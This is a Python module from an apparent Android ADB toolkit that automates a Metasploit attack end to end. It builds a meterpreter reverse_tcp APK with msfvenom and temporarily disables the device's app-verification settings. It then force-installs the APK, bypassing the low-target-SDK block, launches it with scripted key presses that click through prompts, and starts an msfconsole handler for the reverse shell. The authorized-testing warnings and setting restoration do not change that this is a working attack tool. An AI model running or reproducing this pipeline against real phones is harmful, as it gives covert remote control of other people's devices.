"""Metasploit automated attack flow (menu: Launch Metasploit Attack)."""

from __future__ import annotations

import socket
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Literal

from rich.panel import Panel
from rich.table import Table

from modules.config import AppConfig
from modules.console import (
    adb,
    adb_output,
    ask,
    clear_terminal,
    confirm,
    console,
    get_adb_executable,
    go_back_to_main_menu,
    print_error,
    print_option_list,
    print_submenu_header,
    print_success,
    print_warning,
    show_options,
    task_status,
)
from modules.connection import (
    get_ip_address,
    is_valid_ipv4,
    list_local_ipv4,
    list_ready_device_serials,
)

PAYLOAD_NAME = "android/meterpreter/reverse_tcp"
PAYLOAD_PACKAGE = "com.metasploit.stage"
DEFAULT_APK = Path("test.apk")
DEFAULT_LPORT = "4444"
_METASPLOIT_TRAIL = ("Launch Metasploit Attack",)

StepState = Literal["pending", "running", "done", "failed", "skipped"]

_STEP_LABEL: dict[StepState, str] = {
    "pending": "[dim]pending[/dim]",
    "running": "[bold cyan]running…[/bold cyan]",
    "done": "[bold green]done[/bold green]",
    "failed": "[bold red]failed[/bold red]",
    "skipped": "[dim]skipped[/dim]",
}


@dataclass
class _SessionConfig:
    lhost: str
    lport: str
    reuse_payload: bool
    device_serial: str
    android_sdk: str


@dataclass
class _AttackSteps:
    names: list[str] = field(
        default_factory=lambda: [
            "Build APK (msfvenom)",
            "Prepare device",
            "Install payload",
            "Launch payload",
            "Start msfconsole handler",
        ]
    )
    states: list[StepState] = field(default_factory=lambda: ["pending"] * 5)


def hack(config: AppConfig) -> None:
    action = _show_briefing(config)
    if action is None:
        return
    if action == "uninstall":
        _uninstall_payload_only(config)
        return

    session = _preflight_and_configure(config)
    if session is None:
        return

    if not confirm(
        "[bold red]WARNING:[/bold red] Payload install, security settings changes, Metasploit. "
        "Authorized testing only. Continue?"
    ):
        return

    if _run_pipeline(config, session) and confirm("Uninstall the payload from the device?"):
        _uninstall_payload()


def _show_briefing(config: AppConfig) -> Literal["start", "uninstall"] | None:
    clear_terminal(config)
    print_submenu_header(*_METASPLOIT_TRAIL)

    console.print(
        Panel(
            "Detects [bold]LHOST[/bold], builds an Android meterpreter APK with [bold]msfvenom[/bold], "
            "installs it on the connected device, launches the stage, and starts [bold]msfconsole[/bold] "
            "as a reverse handler.\n\n[dim]Use Ctrl+C to stop at any point during the flow.[/dim]",
            title="[bold cyan]Overview[/bold cyan]",
            border_style="bold cyan",
        )
    )

    cmd_table = Table(
        title="After a session opens",
        show_header=True,
        header_style="bold cyan",
    )
    cmd_table.add_column("Goal", style="bold yellow")
    cmd_table.add_column("Command", style="white")
    cmd_table.add_row("List meterpreter commands", "[green]meterpreter >[/green] [yellow]help[/yellow]")
    cmd_table.add_row("Leave meterpreter", "[green]meterpreter >[/green] [yellow]exit[/yellow]")
    cmd_table.add_row("Leave Metasploit", "[green]msf6 >[/green] [yellow]exit -y[/yellow]")
    console.print(cmd_table)

    console.print(
        Panel(
            "Installs a payload and temporarily disables app verification on the device. "
            "Use only on devices you own or have explicit permission to test.",
            title="[bold yellow]Authorized testing only[/bold yellow]",
            border_style="bold yellow",
        )
    )

    console.print()
    print_option_list(["Start attack", "Uninstall existing payload"])
    console.print("\n  [bold dim]0:[/bold dim] Back")

    choice = ask("[prompt]> [/prompt]").strip()
    if choice == "0":
        return None
    if choice == "2":
        return "uninstall"
    if choice == "1":
        return "start"
    go_back_to_main_menu(config)
    return None


def _port_in_use(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(0.5)
        return sock.connect_ex(("127.0.0.1", port)) == 0


def _payload_installed() -> bool:
    r = adb(["shell", "pm", "path", PAYLOAD_PACKAGE])
    out = (r.stdout + r.stderr).strip()
    return r.returncode == 0 and out.startswith("package:")


def _uninstall_payload() -> None:
    with task_status(f"[info]Uninstalling {PAYLOAD_PACKAGE}…[/info]"):
        r = adb(["uninstall", PAYLOAD_PACKAGE])
    detail = (r.stdout + r.stderr).strip()
    if r.returncode == 0 and "Success" in detail:
        print_success(f"Removed {PAYLOAD_PACKAGE}.")
    else:
        print_error(detail or "Uninstall failed.")


def _uninstall_payload_only(config: AppConfig) -> None:
    clear_terminal(config)
    print_submenu_header(*_METASPLOIT_TRAIL, "Uninstall payload")
    if not list_ready_device_serials():
        print_error("No authorized ADB device connected.")
        return
    if not _payload_installed():
        print_warning(f"{PAYLOAD_PACKAGE} is not installed on the device.")
        return
    if not confirm(f"Uninstall [bold yellow]{PAYLOAD_PACKAGE}[/bold yellow] from the device?"):
        return
    _uninstall_payload()


def _pick_lhost(config: AppConfig) -> str | None:
    ips = list_local_ipv4()
    default = get_ip_address()
    if not ips:
        ips = [default or "127.0.0.1"]

    labels: list[str] = []
    for ip in ips:
        tag = " (recommended)" if ip == default else ""
        labels.append(f"{ip}{tag}")
    labels.append("Enter custom IP")

    show_options(
        config,
        "Select LHOST",
        labels,
        breadcrumb=["Main Menu", *_METASPLOIT_TRAIL, "LHOST"],
    )
    choice = ask("[prompt]> [/prompt]").strip()
    custom_idx = str(len(ips) + 1)

    if choice == "0":
        return None
    if choice == custom_idx:
        ip = ask("[bold cyan]LHOST[/bold cyan]> ").strip()
        if not is_valid_ipv4(ip):
            print_error("Invalid LHOST.")
            go_back_to_main_menu(config)
            return None
        return ip

    if choice.isdigit():
        idx = int(choice)
        if 1 <= idx <= len(ips):
            return ips[idx - 1]

    go_back_to_main_menu(config)
    return None


def _pick_lport(config: AppConfig, initial: str) -> str | None:
    lport = initial
    while True:
        show_options(
            config,
            "LPORT",
            [f"Keep {lport}", "Enter custom port"],
            breadcrumb=["Main Menu", *_METASPLOIT_TRAIL, "LPORT"],
        )
        choice = ask("[prompt]> [/prompt]").strip()
        if choice in ("1", ""):
            port = int(lport)
        elif choice == "2":
            raw = ask("[bold cyan]LPORT[/bold cyan]> ").strip()
            if raw.isdigit() and 1 <= int(raw) <= 65535:
                lport = raw
                port = int(lport)
            else:
                print_warning("Invalid LPORT → keeping previous value.")
                continue
        elif choice == "0":
            return None
        else:
            go_back_to_main_menu(config)
            return None

        if _port_in_use(port):
            print_warning(f"Port {port} appears to be in use on this machine. Choose another port.")
            continue
        return lport


def _preflight_and_configure(config: AppConfig) -> _SessionConfig | None:
    clear_terminal(config)
    print_submenu_header(*_METASPLOIT_TRAIL, "Pre-flight")

    msf_ok = bool(config.msfvenom_path and config.msfconsole_path)
    serials = list_ready_device_serials()
    device_ok = len(serials) > 0
    payload_on_device = False
    model = release = sdk = ""

    if device_ok:
        with task_status("[info]Reading device properties…[/info]"):
            model = adb_output(["shell", "getprop", "ro.product.model"]).strip()
            release = adb_output(["shell", "getprop", "ro.build.version.release"]).strip()
            sdk = adb_output(["shell", "getprop", "ro.build.version.sdk"]).strip()
            payload_on_device = _payload_installed()

    lport = DEFAULT_LPORT
    port_busy = _port_in_use(int(lport))

    pre = Table(title="Pre-flight", show_header=True, header_style="bold cyan")
    pre.add_column("Check", style="bold yellow")
    pre.add_column("Result", style="white")
    pre.add_row(
        "Metasploit (msfvenom & msfconsole)",
        "[bold green]OK[/bold green]" if msf_ok else "[bold red]Missing[/bold red]",
    )
    pre.add_row(
        "ADB device",
        f"[bold green]{serials[0]}[/bold green]" + (f" (+{len(serials)-1} more)" if len(serials) > 1 else "")
        if device_ok
        else "[bold red]None connected[/bold red]",
    )
    if device_ok:
        pre.add_row("Device", f"{model or '?'} · Android {release or '?'} · SDK {sdk or '?'}")
    pre.add_row(
        "Payload installed",
        f"[bold yellow]{PAYLOAD_PACKAGE}[/bold yellow]" if payload_on_device else "[dim]Not installed[/dim]",
    )
    pre.add_row(
        f"LPORT {lport} (local)",
        "[bold yellow]In use[/bold yellow]" if port_busy else "[bold green]Available[/bold green]",
    )
    console.print(pre)

    if not msf_ok:
        print_error("Metasploit-Framework not found. Install msfvenom and msfconsole.")
        return None
    if not device_ok:
        print_error("Connect an authorized ADB device and try again.")
        return None

    lhost = _pick_lhost(config)
    if lhost is None:
        return None
    lport = _pick_lport(config, DEFAULT_LPORT)
    if lport is None:
        return None

    reuse = False
    if payload_on_device:
        show_options(
            config,
            "Existing payload",
            ["Reuse installed payload", "Rebuild and reinstall"],
            breadcrumb=["Main Menu", *_METASPLOIT_TRAIL, "Payload"],
        )
        pchoice = ask("[prompt]> [/prompt]").strip()
        if pchoice == "1":
            reuse = True
            print_warning(
                "Reuse only works if LHOST/LPORT match the APK already on the device. "
                "If the session fails to connect, rebuild with the correct LHOST/LPORT."
            )
        elif pchoice not in ("2", ""):
            go_back_to_main_menu(config)
            return None

    apk_path = str(DEFAULT_APK.resolve())
    session = _SessionConfig(
        lhost=lhost,
        lport=lport,
        reuse_payload=reuse,
        device_serial=serials[0],
        android_sdk=sdk,
    )

    clear_terminal(config)
    print_submenu_header(*_METASPLOIT_TRAIL, "Session")

    summary = Table(title="Session", show_header=True, header_style="bold cyan")
    summary.add_column("Setting", style="bold yellow")
    summary.add_column("Value", style="white")
    summary.add_row("LHOST", session.lhost)
    summary.add_row("LPORT", session.lport)
    summary.add_row("Payload", PAYLOAD_NAME)
    summary.add_row("Package", PAYLOAD_PACKAGE)
    summary.add_row("APK path", apk_path)
    summary.add_row("Install mode", "Reuse existing" if session.reuse_payload else "Rebuild and reinstall")
    summary.add_row("Device", session.device_serial)
    console.print(summary)

    if session.android_sdk.isdigit() and int(session.android_sdk) >= 34:
        console.print(
            "[dim]Android 14+ may require adb install --bypass-low-target-sdk-block (handled automatically).[/dim]"
        )
    usb_like = ":" not in session.device_serial
    if session.lhost == "127.0.0.1" or usb_like:
        console.print(
            "[dim]Ensure the phone can reach LHOST on your network (USB-only sessions still need a reachable handler IP).[/dim]"
        )

    return session


def _print_running_screen(config: AppConfig, steps: _AttackSteps) -> None:
    clear_terminal(config)
    print_submenu_header(*_METASPLOIT_TRAIL, "Running")
    _render_steps(steps)


def _render_steps(steps: _AttackSteps) -> None:
    table = Table(title="Attack progress", show_header=True, header_style="bold cyan")
    table.add_column("#", style="bold white", justify="right")
    table.add_column("Step", style="white")
    table.add_column("Status", style="white")
    for i, (name, state) in enumerate(zip(steps.names, steps.states), 1):
        table.add_row(str(i), name, _STEP_LABEL[state])
    console.print(table)


def _run_pipeline(config: AppConfig, session: _SessionConfig) -> bool:
    steps = _AttackSteps()
    apk_out = DEFAULT_APK
    msfvenom = config.msfvenom_path or "msfvenom"
    msfconsole = config.msfconsole_path or "msfconsole"
    verifiers_disabled = False

    _print_running_screen(config, steps)

    try:
        if session.reuse_payload:
            steps.states[0] = "skipped"
            _print_running_screen(config, steps)
        else:
            steps.states[0] = "running"
            _print_running_screen(config, steps)
            with task_status("[info]msfvenom: building APK…[/info]"):
                result = subprocess.run(
                    [
                        msfvenom,
                        "-p",
                        PAYLOAD_NAME,
                        f"LHOST={session.lhost}",
                        f"LPORT={session.lport}",
                        "-o",
                        str(apk_out),
                    ],
                    capture_output=True,
                    text=True,
                )
            if result.returncode != 0:
                steps.states[0] = "failed"
                _print_running_screen(config, steps)
                print_error(f"msfvenom failed: {result.stderr or result.stdout}")
                return False
            if not apk_out.is_file():
                steps.states[0] = "failed"
                _print_running_screen(config, steps)
                print_error("test.apk missing after msfvenom.")
                return False
            steps.states[0] = "done"
            _print_running_screen(config, steps)

        steps.states[1] = "running"
        _print_running_screen(config, steps)
        with task_status("[info]Preparing device (home, verify settings)…[/info]"):
            adb(["shell", "input", "keyevent", "3"])
            adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"])
            adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"])
        verifiers_disabled = True
        steps.states[1] = "done"
        _print_running_screen(config, steps)

        if session.reuse_payload:
            steps.states[2] = "skipped"
            _print_running_screen(config, steps)
        else:
            steps.states[2] = "running"
            _print_running_screen(config, steps)
            adb_exe = get_adb_executable()
            with task_status("[info]adb install payload…[/info]"):
                install = subprocess.run(
                    [adb_exe or "adb", "install", "-r", str(apk_out)],
                    capture_output=True,
                    text=True,
                )
                if install.returncode != 0 and "INSTALL_FAILED_DEPRECATED_SDK_VERSION" in (
                    install.stdout + install.stderr
                ):
                    print_warning(
                        "Device rejects old targetSdkVersion — retrying with --bypass-low-target-sdk-block…"
                    )
                    install = subprocess.run(
                        [
                            adb_exe or "adb",
                            "install",
                            "--bypass-low-target-sdk-block",
                            "-r",
                            str(apk_out),
                        ],
                        capture_output=True,
                        text=True,
                    )
            if install.returncode != 0:
                steps.states[2] = "failed"
                _print_running_screen(config, steps)
                detail = (install.stdout + install.stderr).strip() or f"exit code {install.returncode}"
                print_error(f"adb install failed: {detail}")
                return False
            steps.states[2] = "done"
            _print_running_screen(config, steps)

        steps.states[3] = "running"
        _print_running_screen(config, steps)
        with task_status("[info]Launching payload…[/info]"):
            adb(["shell", "monkey", "-p", PAYLOAD_PACKAGE, "1"])
            time.sleep(3)
            adb(["shell", "input", "keyevent", "22"])
            adb(["shell", "input", "keyevent", "22"])
            adb(["shell", "input", "keyevent", "66"])
        steps.states[3] = "done"
        _print_running_screen(config, steps)

        steps.states[4] = "running"
        _print_running_screen(config, steps)
        console.print(
            "[bold cyan]Starting msfconsole handler…[/bold cyan] "
            "[dim](interactive — use exit / exit -y in msfconsole, or Ctrl+C to return)[/dim]"
        )
        subprocess.run(
            [
                msfconsole,
                "-x",
                f"use exploit/multi/handler ; set PAYLOAD {PAYLOAD_NAME} ; "
                f"set LHOST {session.lhost} ; set LPORT {session.lport} ; exploit",
            ]
        )
        steps.states[4] = "done"
        _print_running_screen(config, steps)
        return True
    finally:
        if verifiers_disabled:
            _restore_verifiers()


def _restore_verifiers() -> None:
    with task_status("[info]Restoring app verification…[/info]"):
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
